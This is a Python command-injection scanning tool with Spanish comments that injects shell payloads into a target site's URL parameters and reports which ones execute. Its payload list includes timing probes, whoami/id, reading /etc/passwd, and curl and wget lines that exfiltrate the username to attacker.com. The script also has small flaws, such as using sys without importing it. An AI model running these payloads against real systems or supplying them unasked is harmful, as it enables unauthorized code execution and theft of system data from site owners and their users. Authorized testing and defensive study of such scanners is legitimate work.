#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
COMMAND INJECTION v2.0 - TANQUE EDITION
RCE Detection · WAF Bypass · Blind Command Injection
"""

import asyncio
import re
import time
import random
from urllib.parse import quote, urlparse, urljoin
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url, **kwargs): return None

class CommandInjection:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        
        # Payloads priorizados
        self.payloads = [
            # Time-based (más fiables, menos ruido)
            ("; sleep 5", "sleep_5", "linux", 10),
            ("| sleep 5", "pipe_sleep", "linux", 9),
            ("`sleep 5`", "backtick_sleep", "linux", 9),
            ("$(sleep 5)", "subshell_sleep", "linux", 9),
            ("& ping -n 5 127.0.0.1", "windows_ping", "windows", 8),
            ("& timeout 5", "windows_timeout", "windows", 8),
            
            # Output-based (cuando hay reflejo)
            ("; whoami", "whoami", "linux", 7),
            ("| whoami", "pipe_whoami", "linux", 7),
            ("& whoami", "windows_whoami", "windows", 7),
            ("; id", "id", "linux", 7),
            ("; pwd", "pwd", "linux", 6),
            ("& ipconfig", "ipconfig", "windows", 6),
            
            # Data exfiltration (peligrosos, con cuidado)
            ("; cat /etc/passwd", "cat_passwd", "linux", 5),
            ("; curl http://attacker.com/$(whoami)", "curl_exfil", "linux", 4),
            ("& wget http://attacker.com/$(whoami)", "wget_exfil", "windows", 4),
        ]
        
        # Patrones de éxito
        self.success_patterns = [
            (r'uid=\d+\(\w+\)', 'linux_id'),
            (r'gid=\d+\(\w+\)', 'linux_id'),
            (r'root:x?:0:0:', 'passwd'),
            (r'Microsoft Windows', 'windows'),
            (r'ipconfig\.exe', 'windows_ipconfig'),
            (r'Directorio de', 'windows_dir'),
            (r'/home/\w+', 'linux_home'),
            (r'www-data', 'www_user'),
        ]
        
    async def setup(self):
        """Inicializa cliente HTTP tanque"""
        self.client = HTTPClient(timeout=20, max_retries=2)
        
    async def measure_baseline(self, url: str) -> Dict:
        """Mide tiempos baseline para detección time-based"""
        times = []
        
        for i in range(3):
            try:
                start = time.time()
                resp = await self.client.get(url)
                if resp:
                    elapsed = time.time() - start
                    times.append(elapsed)
                await asyncio.sleep(1)
            except:
                pass
                
        avg_time = sum(times) / len(times) if times else 0.5
        return {'avg_time': avg_time, 'threshold': avg_time + 2.0}
        
    async def extract_params(self) -> List[str]:
        """Extrae parámetros vulnerables"""
        params = []
        
        # De la URL
        if '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
                    
        # Parámetros comunes para command injection
        common_cmd_params = [
            'cmd', 'command', 'exec', 'system', 'shell', 'ping',
            'traceroute', 'host', 'nslookup', 'dig', 'whois',
            'file', 'path', 'dir', 'ls', 'cat', 'more', 'less',
            'download', 'upload', 'wget', 'curl', 'fetch'
        ]
        
        params.extend(common_cmd_params)
        return list(set(params))
        
    def detect_success(self, text: str, elapsed: float, threshold: float) -> List[str]:
        """Detecta indicadores de inyección exitosa"""
        indicators = []
        
        # Time-based
        if elapsed > threshold:
            indicators.append(f"TIME_BASED: {elapsed:.2f}s")
            
        # Output-based
        for pattern, name in self.success_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                indicators.append(name)
                
        # Errores que indican ejecución
        error_patterns = [
            'command not found',
            'no se reconoce',
            'is not recognized',
            'sh:',
            'bash:',
            'cmd.exe',
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in text.lower():
                indicators.append(f"ERROR: {pattern}")
                
        return indicators
        
    async def test_param(self, base_url: str, param: str, payload: tuple) -> Optional[Dict]:
        """Prueba un payload en un parámetro"""
        payload_str, payload_name, os_type, priority = payload
        
        try:
            # Construir URL
            if '?' in base_url:
                test_url = base_url.replace(f"{param}=", f"{param}={quote(payload_str)}")
            else:
                test_url = f"{base_url}?{param}={quote(payload_str)}"
                
            # Medir tiempo
            start = time.time()
            resp = await self.client.get(test_url)
            elapsed = time.time() - start
            
            if not resp:
                return None
                
            text = await resp.text()
            
            # Detectar indicadores
            indicators = self.detect_success(text, elapsed, self.baseline['threshold'])
            
            if indicators:
                severity = 'CRITICO' if any('TIME' in i or 'root' in i for i in indicators) else 'ALTO'
                
                return {
                    'type': 'COMMAND_INJECTION',
                    'param': param,
                    'payload': payload_str,
                    'payload_name': payload_name,
                    'os_type': os_type,
                    'url': test_url,
                    'status': resp.status,
                    'time': round(elapsed, 2),
                    'indicators': indicators,
                    'severity': severity,
                    'priority': priority
                }
                
        except asyncio.TimeoutError:
            # Timeout puede indicar sleep
            if 'sleep' in payload_name:
                return {
                    'type': 'COMMAND_INJECTION_TIMEOUT',
                    'param': param,
                    'payload': payload_str,
                    'payload_name': payload_name,
                    'url': test_url,
                    'time': 20,
                    'indicators': ['TIMEOUT - Posible sleep'],
                    'severity': 'ALTO',
                    'priority': priority
                }
        except:
            pass
        return None
        
    async def scan(self):
        """Ejecuta escaneo completo"""
        print(f"\n💀 COMMAND INJECTION TANQUE - {self.url}")
        print("=" * 60)
        
        await self.setup()
        
        try:
            # Extraer parámetros
            params = await self.extract_params()
            print(f"[*] Probando {len(params)} parámetros")
            
            # Medir baseline
            self.baseline = await self.measure_baseline(self.url)
            print(f"[*] Baseline: {self.baseline['avg_time']:.2f}s (threshold: {self.baseline['threshold']:.2f}s)")
            
            # Probar cada parámetro
            for param in params[:10]:  # Limitar a 10 para no saturar
                print(f"\n[*] Parámetro: {param}")
                
                for payload in sorted(self.payloads, key=lambda x: x[4], reverse=True):
                    # Rate limiting
                    await asyncio.sleep(random.uniform(1, 2))
                    
                    result = await self.test_param(self.url, param, payload)
                    
                    if result:
                        self.findings.append(result)
                        
                        if result['severity'] == 'CRITICO':
                            print(f"    [[CRITICO]] {result['payload_name']}")
                            for i in result['indicators'][:2]:
                                print(f"         ↳ {i}")
                        else:
                            print(f"    [[WARN]] {result['payload_name']}")
                            
                        # Si encontramos crítico, no seguir con más payloads
                        if result['severity'] == 'CRITICO' and result.get('priority', 0) >= 8:
                            break
                            
            # Mostrar resumen
            print("\n" + "="*60)
            print("📊 RESULTADOS COMMAND INJECTION")
            print("="*60)
            
            if self.findings:
                criticos = [f for f in self.findings if f['severity'] == 'CRITICO']
                altos = [f for f in self.findings if f['severity'] == 'ALTO']
                
                if criticos:
                    print(f"\n[CRITICO] CRÍTICOS: {len(criticos)}")
                    for f in criticos[:5]:
                        print(f"   • {f['param']}: {f['payload_name']}")
                        if f.get('indicators'):
                            print(f"     ↳ {f['indicators'][0]}")
                            
                if altos:
                    print(f"\n[WARN]  ALTOS: {len(altos)}")
                    
                print(f"\n[OK] Total: {len(self.findings)}")
            else:
                print("\n[OK] No se detectó inyección de comandos")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 command_injection.py <URL>")
        sys.exit(1)
        
    scanner = CommandInjection(sys.argv[1])
    await scanner.scan()

if __name__ == "__main__":
    asyncio.run(main())
